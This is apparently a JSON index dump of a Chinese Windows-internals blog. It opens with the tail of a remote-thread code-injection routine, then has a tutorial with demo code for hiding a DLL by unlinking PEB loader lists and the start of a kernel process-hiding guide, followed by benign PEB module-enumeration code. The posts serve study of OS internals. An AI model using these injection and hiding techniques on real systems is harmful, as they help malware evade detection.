0x%p\\n&quot;, EXECPIC_SIZE, pCode); bStatus = WriteProcessMemory(hProc, pCode, EXECPIC, EXECPIC_SIZE, &amp;written); if (bStatus) &#123; if (cmd != NULL) &#123; printf(&quot; [ allocating %lu bytes of RW memory in process for parameter\\n&quot;, CmdSize); pData = VirtualAllocEx(hProc, 0, CmdSize + 1, MEM_COMMIT, PAGE_READWRITE); if (pData != NULL) &#123; printf(&quot; [ writing %lu bytes of data to 0x%p\\n&quot;, CmdSize, pData); bStatus = WriteProcessMemory(hProc, pData, cmd, CmdSize, &amp;written); if (!bStatus) &#123; printf(&quot; [ warning: unable to allocate write parameters to process...&quot;); &#125; &#125; &#125; printf(&quot; [ creating thread\\n&quot;); hThread = NULL; CreateRemoteThread64 = (pCreateRemoteThread64) init_func(CREATETHREADPIC, CREATETHREADPIC_SIZE); CreateRemoteThread64(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pCode, pData, 0, 0, &amp;hThread); if (hThread != NULL) &#123; printf(&quot; [ waiting for thread %lx to terminate\\n&quot;, (DWORD)hThread); idx = WaitForSingleObject(hThread, INFINITE); if (idx != 0) &#123; MessageBox(NULL, &quot;WaitForSingleObject&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); &#125; ec = 0; if (GetExitCodeThread(hThread, &amp;ec)) &#123; printf(&quot; [ exit code was %lu (%08lX)&quot;, ec, ec); &#125; CloseHandle(hThread); &#125; else &#123; MessageBox(NULL, &quot;CreateRemoteThread&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); &#125; &#125; if (idx == 0) &#123; VirtualFreeEx(hProc, pCode, 0, MEM_RELEASE); if (pData != NULL) &#123; VirtualFreeEx(hProc, pData, 0, MEM_RELEASE); &#125; &#125; &#125; else &#123; MessageBox(NULL, &quot;VirtualFreeEx()&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); &#125; CloseHandle(hProc); &#125; else &#123; MessageBox(NULL, &quot;OpenProcess&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); &#125; if (CreateRemoteThread64 != NULL) free_func(CreateRemoteThread64); return bStatus; &#125;&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【windows】重要结构体之间的关系","date":"2024-01-23T06:08:14.151Z","path":"A_OS/Windows/【win】重要结构体之间的关系/","text":"概述：一图展示windows重要结构体之间的关系","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【windows】通过断链隐藏模块(DLL）","date":"2024-01-23T06:08:14.145Z","path":"A_OS/Windows/【win】通过断链隐藏模块/","text":"概述：主要通过 TEB + PEB 实现 0x01 三环断链(EPB断链)作用：3环断链通常用于在用户层隐藏dll 1 步骤说明获取dll模块的步骤： 获取TEB 获取PEB 获取ldr dll模块 详细步骤： &#x3D;&#x3D;TEB&#x3D;&#x3D; 的获取方法为: $fs:[0]$ 通过 &#x3D;&#x3D;TEB&#x3D;&#x3D; 结构体发现， PPEB(PEB指针，只想PEB结构体首地址)，位于 &#x3D;&#x3D;TEB&#x3D;&#x3D; 偏移 &#x3D;&#x3D;0x30&#x3D;&#x3D; 处，因此 $PPEB &#x3D;&#x3D; fs:[0x30]$ 通过 &#x3D;&#x3D;PEB&#x3D;&#x3D; 结构体发现， &#x3D;&#x3D;ldr&#x3D;&#x3D; 位于 &#x3D;&#x3D;PEB&#x3D;&#x3D; 偏移 &#x3D;&#x3D;0xc&#x3D;&#x3D; 处,因此 $ldr&#x3D;&#x3D;PPEB+0xc$ 通过 &#x3D;&#x3D;ldr&#x3D;&#x3D; 指向的结构体 _PEN_LDR_DATA 结构体找到3个双向循环链表 _LIST_ENTRY 结构体。 _LIST_ENTRY 结构体中有两个成员，指向前驱模块节点的 _LIST_ENTRY、指向后继模块节点的 _LIST_ENTRY 。 节点指针指向的是 _LIST_ENTRY 结构体，该结构体存储了模块在链表中的位置信息 通过 _LDR_DATA_TATBLE_ENTRY 结构体中偏移 &#x3D;&#x3D;0x18&#x3D;&#x3D; 的 DllBase 确定要隐藏的dll,并通过该结构体中的 _LIST_ENTRY 结构体删除该节点在链表中的位置信息（双向循环链表删除节点），即可达到3环下的dll隐藏。 _LDR_DATA_TABLE_ENTRY 与 _PEB_LDR_DATA 的关系： _LDR_DATA_TABLE_ENTRY 与 _PEB_LDR_DATA 的关系是，_LDR_DATA_TABLE_ENTRY 是 _PEB_LDR_DATA 结构的一部分，用于存储模块加载相关信息。 具体来说，_PEB_LDR_DATA 结构包含三个链表排序方式，分别是模块加载顺序、模块内存顺序、模块初始化顺序。这些链表结构是通过_LDR_DATA_TABLE_ENTRY 来存储的，每个 _LDR_DATA_TABLE_ENTRY 都包含了模块的相关信息，如模块名称、模块大小、模块地址等。 在调试信息中，可以通过断点和查看寄存器等方式来查看 _LDR_DATA_TABLE_ENTRY 和 _PEB_LDR_DATA 的内容，进而分析模块的加载和运行情况。 2 相关结构体TEB1234567891011121314151617kd&gt; dt _TEBntdll!_TEB +0x000 NtTib : _NT_TIB +0x01c EnvironmentPointer : Ptr32 Void +0x020 ClientId : _CLIENT_ID +0x028 ActiveRpcHandle : Ptr32 Void +0x02c ThreadLocalStoragePointer : Ptr32 Void +0x030 ProcessEnvironmentBlock : Ptr32 _PEB // PPEB +0x034 LastErrorValue : Uint4B +0x038 CountOfOwnedCriticalSections : Uint4B +0x03c CsrClientThread : Ptr32 Void +0x040 Win32ThreadInfo : Ptr32 Void +0x044 User32Reserved : [26] Uint4B +0x0ac UserReserved : [5] Uint4B +0x0c0 WOW32Reserved : Ptr32 Void +0x0c4 CurrentLocale : Uint4B ... ... PEB123456789101112131415161718kd&gt; dt _PEBntdll!_PEB +0x000 InheritedAddressSpace : UChar +0x001 ReadImageFileExecOptions : UChar +0x002 BeingDebugged : UChar +0x003 SpareBool : UChar +0x004 Mutant : Ptr32 Void +0x008 ImageBaseAddress : Ptr32 Void +0x00c Ldr : Ptr32 _PEB_LDR_DATA // ldr +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS +0x014 SubSystemData : Ptr32 Void +0x018 ProcessHeap : Ptr32 Void +0x01c FastPebLock : Ptr32 _RTL_CRITICAL_SECTION +0x020 FastPebLockRoutine : Ptr32 Void +0x024 FastPebUnlockRoutine : Ptr32 Void +0x028 EnvironmentUpdateCount : Uint4B +0x02c KernelCallbackTable : Ptr32 Void ... ... ldr的结构体：_PEB_LDR_DATA123456789kd&gt; dt _PEB_LDR_DATAntdll!_PEB_LDR_DATA +0x000 Length : Uint4B +0x004 Initialized : UChar +0x008 SsHandle : Ptr32 Void +0x00c InLoadOrderModuleList : _LIST_ENTRY // 模块加载顺序链表 +0x014 InMemoryOrderModuleList : _LIST_ENTRY // 模块在内存中的顺序链表 +0x01c InInitializationOrderModuleList : _LIST_ENTRY // 模块初始化的顺序链表 +0x024 EntryInProgress : Ptr32 Void _LIST_ENTRY 的结构体：后文结构体强转就是因为 Blink 直接返回的是 _LDR_DATA_TABLE_ENTRY 的首地址。 1234kd&gt; dt _LIST_ENTRYntdll!_LIST_ENTRY +0x000 Flink : Ptr32 _LIST_ENTRY // 指向前驱节点的指针 +0x004 Blink : Ptr32 _LIST_ENTRY // 指向后继节点的指针 补充：_LDR_DATA_TABLE_ENTRY 结构体存储dll模块的信息 1234567891011121314151617181920kd&gt; dt _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY // _LIST_ENTRY结构体中Flink或Blink指向的位置 +0x008 InMemoryOrderLinks : _LIST_ENTRY +0x010 InInitializationOrderLinks : _LIST_ENTRY +0x018 DllBase : Ptr32 Void // dll基址 +0x01c EntryPoint : Ptr32 Void +0x020 SizeOfImage : Uint4B +0x024 FullDllName : _UNICODE_STRING +0x02c BaseDllName : _UNICODE_STRING // dll名称 +0x034 Flags : Uint4B +0x038 LoadCount : Uint2B +0x03a TlsIndex : Uint2B +0x03c HashLinks : _LIST_ENTRY +0x03c SectionPointer : Ptr32 Void +0x040 CheckSum : Uint4B +0x044 TimeDateStamp : Uint4B +0x044 LoadedImports : Ptr32 Void +0x048 EntryPointActivationContext : Ptr32 Void +0x04c PatchInformation : Ptr32 Void 3 Demo123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include&lt;stdio.h&gt;#include&lt;Windows.h&gt;typedef struct _UNICODE_STRING&#123; USHORT Length; //字符串长度 USHORT MaximumLength; //字符串最大长度 PWSTR Buffer; //双字节字符串指针&#125; UNICODE_STRING, * PUNICODE_STRING;typedef struct _PEB_LDR_DATA&#123; ULONG Length; BOOLEAN Initialized; PVOID SsHandle; LIST_ENTRY InLoadOrderModuleList; //代表按加载顺序构成的模块列表 LIST_ENTRY InMemoryOrderModuleList; //代表按内存顺序构成的模块列表 LIST_ENTRY InInitializationOrderModuleList; //代表按初始化顺序构成的模块链表&#125;PEB_LDR_DATA, * PPEB_LDR_DATA;typedef struct _LDR_DATA_TABLE_ENTRY&#123; LIST_ENTRY InLoadOrderModuleList; //代表按加载顺序构成的模块列表 LIST_ENTRY InMemoryOrderModuleList; //代表按内存顺序构成的模块列表 LIST_ENTRY InInitializeationOrderModuleList; //代表按初始化顺序构成的模块链表 PVOID DllBase; //该模块的基地址 PVOID EntryPoint; //该模块的入口 ULONG SizeOfImage; //该模块的影像大小 UNICODE_STRING FullDllName; //模块的完整路径 UNICODE_STRING BaseDllName; //模块名 ULONG Flags; SHORT LoadCount; SHORT TlsIndex; HANDLE SectionHandle; ULONG CheckSum; ULONG TimeDataStamp;&#125;LDR_MODULE, * PLDR_MODULE;PEB_LDR_DATA* g_pPebLdr = NULL;LDR_MODULE* g_pLdrModule = NULL;LIST_ENTRY* g_pInLoadOrderModule;LIST_ENTRY* g_pInMemoryOrderModule;LIST_ENTRY* g_pInInitializeationOrderModule;void ring3BrokenChains(HMODULE hModule)&#123; LIST_ENTRY* pHead = g_pInLoadOrderModule; LIST_ENTRY* pCur = pHead; do &#123; pCur = pCur-&gt;Blink; g_pLdrModule = (PLDR_MODULE)pCur; // 这里为什么可以直接将pCur转为PLDR_MODULE，见下面代码解释 // 这是因为 pCur 指向 _LIST_ENTRY 结构体，指向的地址刚好是_LDR_DATA_TABLE_ENTRY的首地址，因此二者在内存上刚好是对齐的。 // CONTAINING_RECORD这个宏返回成员变量所在结构体的基址，ldte == g_pLdrModule // PLDR_MODULE ldte = CONTAINING_RECORD(pCur, _LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList); if (hModule == g_pLdrModule-&gt;DllBase) &#123; g_pLdrModule-&gt;InLoadOrderModuleList.Blink-&gt;Flink = g_pLdrModule-&gt;InLoadOrderModuleList.Flink; g_pLdrModule-&gt;InLoadOrderModuleList.Flink-&gt;Blink = g_pLdrModule-&gt;InLoadOrderModuleList.Blink; g_pLdrModule-&gt;InInitializeationOrderModuleList.Blink-&gt;Flink = g_pLdrModule-&gt;InInitializeationOrderModuleList.Flink; g_pLdrModule-&gt;InInitializeationOrderModuleList.Flink-&gt;Blink = g_pLdrModule-&gt;InInitializeationOrderModuleList.Blink; g_pLdrModule-&gt;InMemoryOrderModuleList.Blink-&gt;Flink = g_pLdrModule-&gt;InMemoryOrderModuleList.Flink; g_pLdrModule-&gt;InMemoryOrderModuleList.Flink-&gt;Blink = g_pLdrModule-&gt;InMemoryOrderModuleList.Blink; break; &#125; &#125; while (pHead != pCur);&#125;int main(int argc, char* argv[])&#123; __asm &#123; mov eax, fs: [0x30] ; // PPEB mov ecx, [eax + 0xC]; // ldr mov g_pPebLdr, ecx; mov ebx, ecx; add ebx, 0xC; mov g_pInLoadOrderModule, ebx; // 第1个链表 mov ebx, ecx; add ebx, 0x14; mov g_pInMemoryOrderModule, ebx; // 第2个链表 mov ebx, ecx; add ebx, 0x1C; mov g_pInInitializeationOrderModule, ebx; // 第3个链表 &#125; printf(&quot;点任意按键开始断链&quot;); getchar(); ring3BrokenChains(GetModuleHandleA(&quot;kernel32.dll&quot;)); printf(&quot;断链成功\\n&quot;); getchar(); return 0;&#125; 0x02 0环断链(EPROCESS断链)作用：0环断链通常用于在内核层隐藏进程 1 步骤说明获取进程模块的步骤为： 获取 _KPCR 获取 _KPRCB 获取 _KTHREAD 获取 _KAPC_STATE 获取 _KPROCESS 获取 _EPROCESS 详细步骤说明：","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【windows】WOW64通过PEB获取32/64位进程模块信息","date":"2024-01-23T06:08:14.139Z","path":"A_OS/Windows/【win】通过PEB获取进程模块信息/","text":"概述：获取进程模块信息，PEB说明，获取进程环境变量 背景：Windows 下没有能 api 能直接读取进程的环境变量。 wmi 和 powershell 也没有方式能读取进程的环境变量。 在 powershell 5.1 里确实可以通过象这样的命令读取环境变量，但这并不是进程的环境变量。 进程的PEBWindows 下只能通过 PEB 来读取环境变量。PEB 是一个比较庞大且复杂的结构体，微软官方也没有给出这个结构体的详细信息。PEB 的具体结构根据操作系统的版本不同而不同，也和进程的位数有关。PEB 里除了环境变量，还有执行目录，可执行文件路径，命令行等信息。 有关 PEB 结构体内容的，有国外大神开源的结果：Terminus Project Terminus Project - _PEB - x86 view Terminus Project - _PEB - x64 view Demo 查询进程 PEB123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265#include &lt;stdio.h&gt;#include &quot;windows.h&quot; #define NT_SUCCESS(x) ((x) &gt;= 0)#define ProcessBasicInformation 0 typedef NTSTATUS(NTAPI *pfnNtWow64QueryInformationProcess64)( IN HANDLE ProcessHandle, IN ULONG ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength OPTIONAL ); typedef NTSTATUS(NTAPI *pfnNtWow64ReadVirtualMemory64)( IN HANDLE ProcessHandle, IN PVOID64 BaseAddress, OUT PVOID Buffer, IN ULONG64 Size, OUT PULONG64 NumberOfBytesRead ); typedefNTSTATUS(WINAPI *pfnNtQueryInformationProcess)(HANDLE ProcessHandle, ULONG ProcessInformationClass, PVOID ProcessInformation, UINT32 ProcessInformationLength, UINT32* ReturnLength); typedef struct _PROCESS_BASIC_INFORMATION32 &#123; NTSTATUS ExitStatus; UINT32 PebBaseAddress; UINT32 AffinityMask; UINT32 BasePriority; UINT32 UniqueProcessId; UINT32 InheritedFromUniqueProcessId;&#125; PROCESS_BASIC_INFORMATION32; typedef struct _UNICODE_STRING32&#123; USHORT Length; USHORT MaximumLength; PWSTR Buffer;&#125; UNICODE_STRING32, *PUNICODE_STRING32; typedef struct _PEB32&#123; UCHAR InheritedAddressSpace; UCHAR ReadImageFileExecOptions; UCHAR BeingDebugged; UCHAR BitField; ULONG Mutant; ULONG ImageBaseAddress; ULONG Ldr; ULONG ProcessParameters; ULONG SubSystemData; ULONG ProcessHeap; ULONG FastPebLock; ULONG AtlThunkSListPtr; ULONG IFEOKey; ULONG CrossProcessFlags; ULONG UserSharedInfoPtr; ULONG SystemReserved; ULONG AtlThunkSListPtr32; ULONG ApiSetMap;&#125; PEB32, *PPEB32; typedef struct _PEB_LDR_DATA32&#123; ULONG Length; BOOLEAN Initialized; ULONG SsHandle; LIST_ENTRY32 InLoadOrderModuleList; LIST_ENTRY32 InMemoryOrderModuleList; LIST_ENTRY32 InInitializationOrderModuleList; ULONG EntryInProgress;&#125; PEB_LDR_DATA32, *PPEB_LDR_DATA32; typedef struct _LDR_DATA_TABLE_ENTRY32&#123; LIST_ENTRY32 InLoadOrderLinks; LIST_ENTRY32 InMemoryOrderModuleList; LIST_ENTRY32 InInitializationOrderModuleList; ULONG DllBase; ULONG EntryPoint; ULONG SizeOfImage; UNICODE_STRING32 FullDllName; UNICODE_STRING32 BaseDllName; ULONG Flags; USHORT LoadCount; USHORT TlsIndex; union &#123; LIST_ENTRY32 HashLinks; ULONG SectionPointer; &#125;; ULONG CheckSum; union &#123; ULONG TimeDateStamp; ULONG LoadedImports; &#125;; ULONG EntryPointActivationContext; ULONG PatchInformation;&#125; LDR_DATA_TABLE_ENTRY32, *PLDR_DATA_TABLE_ENTRY32; typedef struct _PROCESS_BASIC_INFORMATION64 &#123; NTSTATUS ExitStatus; UINT32 Reserved0; UINT64 PebBaseAddress; UINT64 AffinityMask; UINT32 BasePriority; UINT32 Reserved1; UINT64 UniqueProcessId; UINT64 InheritedFromUniqueProcessId;&#125; PROCESS_BASIC_INFORMATION64;typedef struct _PEB64&#123; UCHAR InheritedAddressSpace; UCHAR ReadImageFileExecOptions; UCHAR BeingDebugged; UCHAR BitField; ULONG64 Mutant; ULONG64 ImageBaseAddress; ULONG64 Ldr; ULONG64 ProcessParameters; ULONG64 SubSystemData; ULONG64 ProcessHeap; ULONG64 FastPebLock; ULONG64 AtlThunkSListPtr; ULONG64 IFEOKey; ULONG64 CrossProcessFlags; ULONG64 UserSharedInfoPtr; ULONG SystemReserved; ULONG AtlThunkSListPtr32; ULONG64 ApiSetMap;&#125; PEB64, *PPEB64; typedef struct _PEB_LDR_DATA64&#123; ULONG Length; BOOLEAN Initialized; ULONG64 SsHandle; LIST_ENTRY64 InLoadOrderModuleList; LIST_ENTRY64 InMemoryOrderModuleList; LIST_ENTRY64 InInitializationOrderModuleList; ULONG64 EntryInProgress;&#125; PEB_LDR_DATA64, *PPEB_LDR_DATA64; typedef struct _UNICODE_STRING64&#123; USHORT Length; USHORT MaximumLength; ULONG64 Buffer;&#125; UNICODE_STRING64, *PUNICODE_STRING64; typedef struct _LDR_DATA_TABLE_ENTRY64&#123; LIST_ENTRY64 InLoadOrderLinks; LIST_ENTRY64 InMemoryOrderModuleList; LIST_ENTRY64 InInitializationOrderModuleList; ULONG64 DllBase; ULONG64 EntryPoint; ULONG SizeOfImage; UNICODE_STRING64 FullDllName; UNICODE_STRING64 BaseDllName; ULONG Flags; USHORT LoadCount; USHORT TlsIndex; union &#123; LIST_ENTRY64 HashLinks; ULONG64 SectionPointer; &#125;; ULONG CheckSum; union &#123; ULONG TimeDateStamp; ULONG64 LoadedImports; &#125;; ULONG64 EntryPointActivationContext; ULONG64 PatchInformation;&#125; LDR_DATA_TABLE_ENTRY64, *PLDR_DATA_TABLE_ENTRY64; int main()&#123; DWORD dwPid = 4480; HANDLE m_ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); BOOL bTarget = FALSE; BOOL bSource = FALSE; IsWow64Process(GetCurrentProcess(), &amp;bSource); IsWow64Process(m_ProcessHandle, &amp;bTarget); SYSTEM_INFO si; GetSystemInfo(&amp;si); if (bTarget == FALSE &amp;&amp; bSource == TRUE) &#123; HMODULE NtdllModule = GetModuleHandle(L&quot;ntdll.dll&quot;); pfnNtWow64QueryInformationProcess64 NtWow64QueryInformationProcess64 = (pfnNtWow64QueryInformationProcess64)GetProcAddress(NtdllModule, &quot;NtWow64QueryInformationProcess64&quot;); pfnNtWow64ReadVirtualMemory64 NtWow64ReadVirtualMemory64 = (pfnNtWow64ReadVirtualMemory64)GetProcAddress(NtdllModule, &quot;NtWow64ReadVirtualMemory64&quot;); PROCESS_BASIC_INFORMATION64 pbi64 = &#123; 0 &#125;; if (NT_SUCCESS(NtWow64QueryInformationProcess64(m_ProcessHandle, ProcessBasicInformation, &amp;pbi64, sizeof(pbi64), NULL))) &#123; DWORD64 Ldr64 = 0; LIST_ENTRY64 ListEntry64 = &#123; 0 &#125;; LDR_DATA_TABLE_ENTRY64 LDTE64 = &#123; 0 &#125;; wchar_t ProPath64[256]; if (NT_SUCCESS(NtWow64ReadVirtualMemory64(m_ProcessHandle, (PVOID64)(pbi64.PebBaseAddress + offsetof(PEB64, Ldr)), &amp;Ldr64, sizeof(Ldr64), NULL))) &#123; if (NT_SUCCESS(NtWow64ReadVirtualMemory64(m_ProcessHandle, (PVOID64)(Ldr64 + offsetof(PEB_LDR_DATA64, InLoadOrderModuleList)), &amp;ListEntry64, sizeof(LIST_ENTRY64), NULL))) &#123; if (NT_SUCCESS(NtWow64ReadVirtualMemory64(m_ProcessHandle, (PVOID64)(ListEntry64.Flink), &amp;LDTE64, sizeof(_LDR_DATA_TABLE_ENTRY64), NULL))) &#123; while (1) &#123; if (LDTE64.InLoadOrderLinks.Flink == ListEntry64.Flink) break; if (NT_SUCCESS(NtWow64ReadVirtualMemory64(m_ProcessHandle, (PVOID64)LDTE64.FullDllName.Buffer, ProPath64, sizeof(ProPath64), NULL))) &#123; printf(&quot;模块基址:0x%llX\\n模块大小:0x%X\\n模块路径:%ls\\n&quot;, LDTE64.DllBase, LDTE64.SizeOfImage, ProPath64); &#125; if (!NT_SUCCESS(NtWow64ReadVirtualMemory64(m_ProcessHandle, (PVOID64)LDTE64.InLoadOrderLinks.Flink, &amp;LDTE64, sizeof(_LDR_DATA_TABLE_ENTRY64), NULL))) break; &#125; &#125; &#125; &#125; &#125; &#125; else if (bTarget == TRUE &amp;&amp; bSource == TRUE || si.wProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture != PROCESSOR_ARCHITECTURE_IA64) &#123; HMODULE NtdllModule = GetModuleHandle(L&quot;ntdll.dll&quot;); pfnNtQueryInformationProcess NtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(NtdllModule, &quot;NtQueryInformationProcess&quot;); PROCESS_BASIC_INFORMATION32 pbi32 = &#123; 0 &#125;; if (NT_SUCCESS(NtQueryInformationProcess(m_ProcessHandle, ProcessBasicInformation, &amp;pbi32, sizeof(pbi32), NULL))) &#123; DWORD Ldr32 = 0; LIST_ENTRY32 ListEntry32 = &#123; 0 &#125;; LDR_DATA_TABLE_ENTRY32 LDTE32 = &#123; 0 &#125;; wchar_t ProPath32[256]; if (ReadProcessMemory(m_ProcessHandle, (PVOID)(pbi32.PebBaseAddress + offsetof(PEB32, Ldr)), &amp;Ldr32, sizeof(Ldr32), NULL)) &#123; if (ReadProcessMemory(m_ProcessHandle, (PVOID)(Ldr32 + offsetof(PEB_LDR_DATA32, InLoadOrderModuleList)), &amp;ListEntry32, sizeof(LIST_ENTRY32), NULL)) &#123; if (ReadProcessMemory(m_ProcessHandle, (PVOID)(ListEntry32.Flink), &amp;LDTE32, sizeof(_LDR_DATA_TABLE_ENTRY32), NULL)) &#123; while (1) &#123; if (LDTE32.InLoadOrderLinks.Flink == ListEntry32.Flink) break; if (ReadProcessMemory(m_ProcessHandle, (PVOID)LDTE32.FullDllName.Buffer, ProPath32, sizeof(ProPath32), NULL)) &#123; printf(&quot;模块基址:0x%X\\n模块大小:0x%X\\n模块路径:%ls\\n&quot;,LDTE32.DllBase,LDTE32.SizeOfImage,ProPath32); &#125; if (!ReadProcessMemory(m_ProcessHandle, (PVOID)LDTE32.InLoadOrderLinks.Flink, &amp;LDTE32, sizeof(_LDR_DATA_TABLE_ENTRY32), NULL)) break; &#125; &#125; &#125; &#125; &#125; &#125; CloseHandle(m_ProcessHandle); getchar();&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【windows】进程相关精华文章整理","date":"2024-01-23T06:08:14.135Z","path":"A_OS/Windows/【win】进程相关精华文章/","text":"PEB 相关基于PEB断链实现进程&#x2F;模块隐藏 - 知乎","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【win】进程和线程拓展（微软官方）","date":"2024-01-23T06:08:14.129Z","path":"A_OS/Windows/【win】进程和线程相关拓展/","text":"概述：微软官方提供的关于进程和线程的一些demo，主要是和进程、线程相关的一些函数说明和使用 参考链接：进程和线程 - Win32 apps | Microsoft Learn","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【windows】获取进程的环境变量","date":"2024-01-23T06:08:14.126Z","path":"A_OS/Windows/【win】获取进程环境变量/","text":"概述: windows 系统下获取进程的环境变量，可参考文章 【通过PEB获取进程模块信息】和 文章 【PEB】。 在网上能看到相关开源的代码，基本上都是读取进程的内存，再遍历相关内存获取，获取保存进程环境变量的块，得到对应的环境变量内容。 相关函数及结构了解首先需要了解PEB的结构，查看PEB可以使用windbg 命令查看 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171: kd&gt; dt _PEBntdll!_PEB +0x000 InheritedAddressSpace : UChar +0x001 ReadImageFileExecOptions : UChar +0x002 BeingDebugged : UChar +0x003 BitField : UChar +0x003 ImageUsesLargePages : Pos 0, 1 Bit +0x003 IsProtectedProcess : Pos 1, 1 Bit +0x003 IsImageDynamicallyRelocated : Pos 2, 1 Bit +0x003 SkipPatchingUser32Forwarders : Pos 3, 1 Bit +0x003 IsPackagedProcess : Pos 4, 1 Bit +0x003 IsAppContainer : Pos 5, 1 Bit +0x003 IsProtectedProcessLight : Pos 6, 1 Bit +0x003 IsLongPathAwareProcess : Pos 7, 1 Bit +0x004 Padding0 : [4] UChar +0x008 Mutant : Ptr64 Void +0x010 ImageBaseAddress : Ptr64 Void +0x018 Ldr : Ptr64 _PEB_LDR_DATA +0x020 ProcessParameters : Ptr64 _RTL_USER_PROCESS_PARAMETERS +0x028 SubSystemData : Ptr64 Void +0x030 ProcessHeap : Ptr64 Void +0x038 FastPebLock : Ptr64 _RTL_CRITICAL_SECTION +0x040 AtlThunkSListPtr : Ptr64 _SLIST_HEADER +0x048 IFEOKey : Ptr64 Void +0x050 CrossProcessFlags : Uint4B +0x050 ProcessInJob : Pos 0, 1 Bit +0x050 ProcessInitializing : Pos 1, 1 Bit +0x050 ProcessUsingVEH : Pos 2, 1 Bit +0x050 ProcessUsingVCH : Pos 3, 1 Bit +0x050 ProcessUsingFTH : Pos 4, 1 Bit +0x050 ProcessPreviouslyThrottled : Pos 5, 1 Bit +0x050 ProcessCurrentlyThrottled : Pos 6, 1 Bit +0x050 ProcessImagesHotPatched : Pos 7, 1 Bit +0x050 ReservedBits0 : Pos 8, 24 Bits +0x054 Padding1 : [4] UChar +0x058 KernelCallbackTable : Ptr64 Void +0x058 UserSharedInfoPtr : Ptr64 Void +0x060 SystemReserved : Uint4B +0x064 AtlThunkSListPtr32 : Uint4B +0x068 ApiSetMap : Ptr64 Void +0x070 TlsExpansionCounter : Uint4B +0x074 Padding2 : [4] UChar +0x078 TlsBitmap : Ptr64 Void +0x080 TlsBitmapBits : [2] Uint4B +0x088 ReadOnlySharedMemoryBase : Ptr64 Void +0x090 SharedData : Ptr64 Void +0x098 ReadOnlyStaticServerData : Ptr64 Ptr64 Void +0x0a0 AnsiCodePageData : Ptr64 Void +0x0a8 OemCodePageData : Ptr64 Void +0x0b0 UnicodeCaseTableData : Ptr64 Void +0x0b8 NumberOfProcessors : Uint4B +0x0bc NtGlobalFlag : Uint4B +0x0c0 CriticalSectionTimeout : _LARGE_INTEGER +0x0c8 HeapSegmentReserve : Uint8B +0x0d0 HeapSegmentCommit : Uint8B +0x0d8 HeapDeCommitTotalFreeThreshold : Uint8B +0x0e0 HeapDeCommitFreeBlockThreshold : Uint8B +0x0e8 NumberOfHeaps : Uint4B +0x0ec MaximumNumberOfHeaps : Uint4B +0x0f0 ProcessHeaps : Ptr64 Ptr64 Void +0x0f8 GdiSharedHandleTable : Ptr64 Void +0x100 ProcessStarterHelper : Ptr64 Void +0x108 GdiDCAttributeList : Uint4B +0x10c Padding3 : [4] UChar +0x110 LoaderLock : Ptr64 _RTL_CRITICAL_SECTION +0x118 OSMajorVersion : Uint4B +0x11c OSMinorVersion : Uint4B +0x120 OSBuildNumber : Uint2B +0x122 OSCSDVersion : Uint2B +0x124 OSPlatformId : Uint4B +0x128 ImageSubsystem : Uint4B +0x12c ImageSubsystemMajorVersion : Uint4B +0x130 ImageSubsystemMinorVersion : Uint4B +0x134 Padding4 : [4] UChar +0x138 ActiveProcessAffinityMask : Uint8B +0x140 GdiHandleBuffer : [60] Uint4B +0x230 PostProcessInitRoutine : Ptr64 void +0x238 TlsExpansionBitmap : Ptr64 Void +0x240 TlsExpansionBitmapBits : [32] Uint4B +0x2c0 SessionId : Uint4B +0x2c4 Padding5 : [4] UChar +0x2c8 AppCompatFlags : _ULARGE_INTEGER +0x2d0 AppCompatFlagsUser : _ULARGE_INTEGER +0x2d8 pShimData : Ptr64 Void +0x2e0 AppCompatInfo : Ptr64 Void +0x2e8 CSDVersion : _UNICODE_STRING +0x2f8 ActivationContextData : Ptr64 _ACTIVATION_CONTEXT_DATA +0x300 ProcessAssemblyStorageMap : Ptr64 _ASSEMBLY_STORAGE_MAP +0x308 SystemDefaultActivationContextData : Ptr64 